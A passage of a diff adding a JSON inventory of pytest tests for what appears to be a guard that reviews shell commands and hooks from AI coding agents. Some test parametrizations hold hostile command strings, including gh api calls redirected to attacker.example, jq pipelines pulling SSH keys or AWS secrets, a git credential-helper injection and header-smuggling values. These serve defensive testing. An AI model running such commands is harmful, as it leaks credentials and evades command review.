+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_real_daemon_reviews_git_fetch_without_repository_bound_cwd",
+    "line": 647,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('command', ('git fetch origin main', 'git --no-pager fetch origin main', \"git -c credential.helper='!echo pwn' fetch origin main\", '/usr/bin/git fetch origin main', 'git fetch origin main; true', 'true && git fetch origin main', 'GIT_DIR=example/.git git fetch origin main', 'git --exec-path=/tmp fetch origin main', 'git -P fetch origin main', 'git -p fetch origin main', 'git --no-lazy-fetch fetch origin main', 'git --no-optional-locks fetch origin main', 'git --no-advice fetch origin main', 'git --literal-pathspecs fetch origin main'))"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_real_daemon_allows_static_github_content_read_with_safe_jq_filter",
+    "line": 718,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('command', (\"gh api -H 'Accept: application/vnd.github.raw+json' 'repos/hashgraph-online/hol-guard/contents/ci/code-quality-baseline.json?ref=main' | jq '{tests: .tests, total: .total}'\", 'gh pr view 1 -tREVIEW', 'gh pr list -q\\'.[] | select(.state == \"REVIEW_REQUIRED\")\\'', \"gh issue list -q'.[] | {REPO: .repository}'\", 'gh pr list -sREVIEW_REQUIRED', 'gh pr list -aRandy', 'gh issue list -aRandy', 'gh pr list -SREVIEW', 'gh run list -cREVIEW_SHA', 'gh run list -aRgithub.com/owner/repo --help', 'gh workflow list -aRowner/repo --help', 'gh pr view 1 -cROwner/Repo --help', 'gh issue list -wRgithub.com/OWNER/REPO --help', 'gh pr list -dROrg/Repo --help', 'gh run list -aRgithub.com/OWNER/REPO --help', 'gh pr view 1 -wRRowner/repo --help', 'gh run list -aRRowner/repo --help', 'gh -Rowner/repo pr view 17', 'gh -Rgithub.com/Owner/Repo pr view 17'))"
+    ],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_real_daemon_keeps_unsafe_github_pipeline_companions_reviewed",
+    "line": 847,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('unsafe_command', (\"gh api user | jq --slurpfile secrets private.json '.'\", \"gh api user | jq 'env | to_entries'\", 'gh api user | jq \\'include \"helpers\"; transform\\'', \"gh api user | jq '.' > result.json\", 'gh api user; gh pr edit 123 --repo example/project --title changed', 'gh api --hostname attacker.example repos/o/r', 'gh api -h attacker.example repos/o/r', 'GH_HOST=attacker.example gh api repos/o/r', 'GH_TOKEN=literal-secret gh api repos/o/r', 'GITHUB_TOKEN=literal-secret gh api repos/o/r', 'GH_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r', 'GITHUB_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r', 'GH_CONFIG_DIR=./alternate gh api repos/o/r', 'env GH_TOKEN=literal-secret gh api repos/o/r', 'env GH_HOST=attacker.example gh api repos/o/r', 'export GH_HOST=attacker.example; gh api repos/o/r | jq .', 'export GH_TOKEN=literal; gh api repos/o/r | jq .', 'GH_HOST=attacker.example; export GH_HOST; gh api repos/o/r | jq .', 'export GH_CONFIG_DIR=./alternate-config; gh api repos/o/r | jq .', 'gh api --hostname github.com --hostname attacker.example repos/o/r', 'export GH_HOST=github.com; GH_HOST=attacker.example; gh api repos/o/r', 'GH_HOST=github.com; export GH_HOST; GH_HOST=attacker.example; gh api repos/o/r', 'export -x GH_TOKEN=literal; gh api repos/o/r', 'readonly -x GH_CONFIG_DIR=./alternate-config; gh api repos/o/r', 'declare -x GH_HOST=attacker.example; gh api repos/o/r', \"GH_HOST=attacker.example bash -lc 'gh api repos/o/r'\", \"bash -lc 'export GH_HOST=attacker.example; gh api repos/o/r'\", 'export GH_HOST=attacker.example; unset gh_host; gh api repos/o/r', 'export GH_HOST=attacker.example; gh_host=github.com gh api repos/o/r', 'f(){ export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .', 'f(){ export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .', 'f(){ export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .', 'function f { export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .', 'function f { export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .', 'function f { export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .', \"shopt -s expand_aliases; alias f='export GH_HOST=attacker.example'; f; gh api repos/o/r | jq .\", \"shopt -s expand_aliases; alias f='export GH_TOKEN=literal'; f; gh api repos/o/r | jq .\", \"shopt -s expand_aliases; alias f='export GH_CONFIG_DIR=./alternate-config'; f; gh api repos/o/r | jq .\", 'gh api repos/o/r | jq --arg x \"$(cat .ssh/id_rsa)\" \\'{x:$x}\\'', 'gh api repos/o/r | jq --arg x \"$GH_TOKEN\" \\'{x:$x}\\'', 'gh api repos/o/r | jq --arg x \"$AWS_SECRET_ACCESS_KEY\" \\'{x:$x}\\'', \"gh api -H 'Authorization: Bearer literal-secret' repos/o/r\", \"gh api -H 'X-Callback: https://evil.example/upload' repos/o/r\", \"gh api -H $'Accept: application/vnd.github.raw+json\\\\r\\\\nX-Evil: yes' repos/o/r\", 'gh pr view 1 --repo ghe.example/owner/repo', 'gh pr view 1 -R ghe.example/owner/repo', \"gh pr view 1 --repo '$OWNER/repo'\", 'gh pr view 1 --repo owner', 'gh pr view 1 --repo', 'GH_REPO=ghe.example/owner/repo gh pr view 1', 'export GH_REPO=ghe.example/owner/repo; gh pr view 1', \"GH_REPO=ghe.example/owner/repo bash -lc 'gh pr view 1'\", \"bash -lc 'export GH_REPO=ghe.example/owner/repo; gh pr view 1'\", 'gh pr view 1 -wRghe.example/owner/repo --help', 'gh pr view 1 -cRghe.example/owner/repo --help', 'gh pr view 1 -wR --help', \"gh pr view 1 -wR'$OWNER/repo' --help\", 'gh pr list -dRghe.example/owner/repo --help', 'gh run list -aRghe.example/owner/repo --help', 'gh workflow list -aRghe.example/owner/repo --help', 'gh run list -aR --help', 'gh pr view 1 -cRghe.example/owner/repo --help', 'gh issue view 1 -cRghe.example/owner/repo --help', 'gh pr view 1 -cROwner/Repo -R owner/repo --help', 'gh -Rghe.example/owner/repo pr view 17', \"gh -R'$OWNER/repo' pr view 17\", 'name=GH_REPO; export $name=ghe.example/o/r; gh pr view 1', 'name=GH_REPO; declare -x $name=ghe.example/o/r; gh pr view 1', \"env --split-string='GH_REPO=ghe.example/o/r gh pr view 1'\", \"env -S 'GH_REPO=ghe.example/o/r gh pr view 1'\", 'gh pr view 1 $REPO_ARGS', \"REPO_ARGS='--repo ghe.example/o/r' bash -lc 'gh pr view 1 $REPO_ARGS'\", \"env REPO_ARGS='-wRghe.example/o/r' bash -lc 'gh pr view 1 $REPO_ARGS'\", 'gh pr view \"$(gh pr view 1 --json number --jq .number)\"', 'gh issue view \"$(gh pr view 1 --json number --jq .number)\"', 'gh pr view \"prefix$(gh pr view 1 --json title --jq .title)\"', '\"gh\" pr view \"$REPO_ARGS\"', 'command -- \"gh\" pr view \"$REPO_ARGS\"', \"g'h' pr view $REPO_ARGS\", 'g\"h\" pr view $REPO_ARGS', 'g\\\\h pr view $REPO_ARGS', '\"/usr/local/bin/gh\" pr view $REPO_ARGS', \"gh pr view 'x\\\\' ; gh pr view ${PR_NUMBER}\", 'env REPO_ARGS=\\'--repo ghe.example/o/r\\' bash -lc \\'\"gh\" pr view $REPO_ARGS\\''))"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_real_daemon_uses_exec_command_workdir_for_verified_git_fetch",
+    "line": 885,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_real_daemon_rejects_untrusted_exec_command_workdir",
+    "line": 931,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('workdir', ('relative/repository', '/'))"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_real_daemon_rejects_temp_root_workdir_without_falling_back_to_repository",
+    "line": 968,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_real_daemon_ignores_workdir_for_opaque_tool",
+    "line": 1011,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_every_known_and_future_executable_event_blocks_preactivation",
+    "line": 60,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('event_name', ('PreToolUse', 'PermissionRequest', 'UserPromptSubmit', 'PostToolUse', 'SessionStart', 'Stop', 'FutureAgentEvent'))"
+    ],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_global_and_workspace_json_and_toml_sources_are_checked_before_any_write",
+    "line": 86,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('scope', ('global', 'project'))",
+      "pytest.mark.parametrize('source_format', ('json', 'toml'))"
+    ],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_inventory_preserves_handler_coordinates_and_execution_fields",
+    "line": 118,
+    "declared_parametrization": [],
+    "assertion_count": 11,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_managed_looking_paths_commands_and_status_are_unmanaged_without_identity",
+    "line": 177,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('handler', ({'type': 'command', 'command': \"python /untrusted/codex_daemon_hook_bridge.py '{}'\", 'statusMessage': 'HOL Guard checking tool action'}, {'type': 'command', 'command': '/home/user/.local/pipx/venvs/hol-guard/bin/python -m codex_plugin_scanner.cli guard hook --harness codex'}))"
+    ],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_authenticated_manifest_binding_is_the_managed_ownership_authority",
+    "line": 194,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_mixed_exact_legacy_and_unmanaged_handlers_block_only_the_unmanaged_handler",
+    "line": 213,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_disabled_unmanaged_entry_and_metadata_only_event_are_preserved_without_review",
+    "line": 236,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_incomplete_inventory_fails_closed_even_when_hooks_are_already_enabled",
+    "line": 289,
+    "declared_parametrization": [
+      "pytest.mark.parametrize(('payload', 'reason_code'), (({'hooks': {'Stop': ['not-a-group']}}, CODEX_HOOK_INVENTORY_MALFORMED_GROUP), ({'hooks': {'Stop': [{'hooks': [{'type': 'future-exec', 'command': 'python3 fixture.py'}]}]}}, CODEX_HOOK_INVENTORY_UNKNOWN_HANDLER), ({'hooks': {'Stop': [{'hooks': [{'type': 'future-exec', 'argv': ['python3', 'fixture.py']}]}]}}, CODEX_HOOK_INVENTORY_UNKNOWN_HANDLER)))"
+    ],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_duplicate_or_malformed_sources_fail_before_writes",
+    "line": 327,
+    "declared_parametrization": [
+      "pytest.mark.parametrize(('path_name', 'content', 'reason_code'), (('hooks.json', '{\"hooks\":{\"Stop\":[]},\"hooks\":{\"FutureAgentEvent\":[]}}\\n', 'codex_hook_inventory_source_duplicate_key'), ('config.toml', '[features]\\nhooks = false\\n[hooks]\\nStop = []\\nStop = []\\n', 'codex_hook_inventory_source_duplicate_key'), ('hooks.json', '{\"hooks\":', 'codex_hook_inventory_source_malformed'), ('config.toml', '[hooks\\n', 'codex_hook_inventory_source_malformed')))"
+    ],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_non_file_config_source_fails_closed_before_writes",
+    "line": 348,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_symlink_config_source_fails_closed_before_writes",
+    "line": 365,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('source_name', ('config.toml', 'hooks.json'))"
+    ],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_hook_inventory.py",
+    "name": "test_source_change_after_inventory_stops_before_activation_write",
+    "line": 388,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cursor_watch_hook_script.py",
+    "name": "test_generated_cursor_hook_allows_block_in_watch",
+    "line": 37,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cursor_watch_hook_script.py",
+    "name": "test_generated_cursor_hook_still_denies_block_when_protected",
+    "line": 46,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cursor_watch_hook_script.py",
+    "name": "test_generated_cursor_hook_ignores_nested_observe_keys",
+    "line": 55,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cursor_watch_hook_script.py",
+    "name": "test_generated_cursor_watch_after_shell_exception_prints_empty",
+    "line": 64,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cursor_watch_hook_script.py",
+    "name": "test_empty_stdin_before_read_allows_when_event_is_baked",
+    "line": 98,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cursor_watch_hook_script.py",
+    "name": "test_empty_stdin_before_shell_pauses_when_event_is_baked",
+    "line": 124,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cursor_watch_hook_script.py",
+    "name": "test_generated_cursor_hook_ignores_stale_allow_on_completed_block",
+    "line": 151,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cursor_watch_hook_script.py",
+    "name": "test_generated_cursor_hook_write_overrides_conflicting_tool_name",
+    "line": 179,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_permission_denied_lifecycle_is_not_canonicalized_to_permission_request",
+    "line": 29,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_cline_after_tool_transport_miss_passes_through_original_result",
+    "line": 42,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_post_tool_fail_safe_continues_the_turn",
+    "line": 50,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_successful_post_tool_block_withholds_without_stopping",
+    "line": 56,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_old_cursor_hooks_allow_empty_stdin_without_baked_event",
+    "line": 64,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_native_off_pretool_continues_without_watch",
+    "line": 73,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_native_policy_not_ready_pretool_continues",
+    "line": 104,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_cursor_write_continues_when_native_unavailable",
+    "line": 118,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_copilot_permission_request_v2_uses_behavior_deny_shape",
+    "line": 129,
+    "declared_parametrization": [],
+    "assertion_count": 17,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_missing_native_fail_safe_codes_continue_mutating_pretool",
+    "line": 170,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_cursor_maps_cannot_finish_block_to_allow",
+    "line": 222,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_cursor_completed_block_ignores_stale_allow_permission",
+    "line": 246,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_invalid_hook_payload_reference_stays_fail_closed",
+    "line": 261,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_retained_byte_limit_stays_fail_closed",
+    "line": 281,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_bounded_cli_cannot_finish_without_policy_action_allows_write",
+    "line": 299,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_codex_unavailable_permission_request_continues_without_auto_allow",
+    "line": 319,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_daemon_session_continuity_edges.py",
+    "name": "test_claude_oversized_forged_notification_still_denies",
+    "line": 328,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_harness_identifier_is_grok",
+    "line": 43,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_aliases_resolve",
+    "line": 46,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_get_adapter_returns_grok_instance",
+    "line": 50,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_grok_is_registered_in_adapter_list",
+    "line": 53,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_detects_managed_config_and_hooks",
+    "line": 60,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_install_writes_managed_hooks_and_config",
+    "line": 89,
+    "declared_parametrization": [],
+    "assertion_count": 20,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_repeated_install_is_idempotent",
+    "line": 124,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_uninstall_removes_only_guard_managed_entries",
+    "line": 138,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_prepare_grok_hook_payload_maps_bash_fixture",
+    "line": 161,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_prepare_grok_hook_payload_maps_read_fixture",
+    "line": 167,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_normalize_grok_hook_payload_builds_shell_envelope",
+    "line": 171,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_allow_response",
+    "line": 183,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_deny_response",
+    "line": 186,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_unsatisfied_review_response_is_denied",
+    "line": 190,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_emit_grok_hook_response_writes_json_line",
+    "line": 194,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_observe_prompt_hook_allows_even_when_policy_blocks",
+    "line": 199,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_grok_block_emits_deny_json_and_stderr",
+    "line": 230,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_remove_managed_block_strips_guard_section",
+    "line": 268,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_fixtures_do_not_include_real_local_paths_or_tokens",
+    "line": 274,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_edit_fixture_normalizes_to_edit_tool",
+    "line": 288,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_mcp_fixture_preserves_server_metadata",
+    "line": 292,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_webfetch_fixture_normalizes_tool",
+    "line": 296,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_webfetch_envelope_keeps_web_tool_name",
+    "line": 300,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_unknown_tool_is_preserved",
+    "line": 309,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_prompt_fixture_normalizes_event",
+    "line": 313,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_malformed_payload_is_handled_safely",
+    "line": 317,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_spawn_subagent_maps_prompt_and_type",
+    "line": 321,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_qualified_mcp_tool_maps_server_and_tool",
+    "line": 327,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_dispatcher_unwrap_aliases_inner_edit_tool",
+    "line": 333,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_subagent_start_is_observe_event",
+    "line": 346,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_read_secret_maps_to_file_read",
+    "line": 353,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_safe_grep_maps_to_file_read",
+    "line": 362,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_session_id_is_preserved",
+    "line": 372,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_workspace_label_is_redacted",
+    "line": 380,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_detects_mcp_servers_from_config",
+    "line": 390,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_mcp_env_keys_and_headers_in_metadata",
+    "line": 407,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_mcp_env_change_changes_artifact_hash",
+    "line": 437,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_mcp_headers_change_changes_artifact_hash",
+    "line": 470,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_mcp_credential_env_emits_secret_risk_signals",
+    "line": 502,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_detects_degraded_always_approve_signal",
+    "line": 527,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_install_preserves_user_config",
+    "line": 535,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_inventory_agent_type_is_grok",
+    "line": 549,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_inventory_snapshot_serializes_grok_harness",
+    "line": 552,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_dedupe_block_reason_removes_repeated_approval_copy",
+    "line": 564,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_deny_response_uses_plain_language_not_raw_json",
+    "line": 574,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_observe_events_never_deny",
+    "line": 579,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_subagent_start_with_tool_name_is_not_prompt",
+    "line": 594,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_session_start_with_read_tool_is_not_file_read",
+    "line": 612,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_spawn_subagent_envelope_is_prompt",
+    "line": 630,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_secret_spawn_prompt_keeps_secret_marker",
+    "line": 639,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_grep_pipe_pattern_is_not_a_shell_pipeline",
+    "line": 649,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_list_dir_maps_to_file_read_of_target",
+    "line": 659,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_qualified_mcp_envelope_is_mcp_tool",
+    "line": 668,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_detects_workflow_and_agent_surfaces",
+    "line": 678,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_grok_adapter.py",
+    "name": "test_grok_fixtures_do_not_contain_secrets_or_local_paths",
+    "line": 699,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_claude_hook_argv.py",
+    "name": "test_install_bakes_source_root_into_structured_session_start_argv",
+    "line": 83,
+    "declared_parametrization": [],
+    "assertion_count": 6,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_guard_claude_hook_argv.py",
+    "name": "test_session_start_argv_preserves_exact_paths",
+    "line": 106,
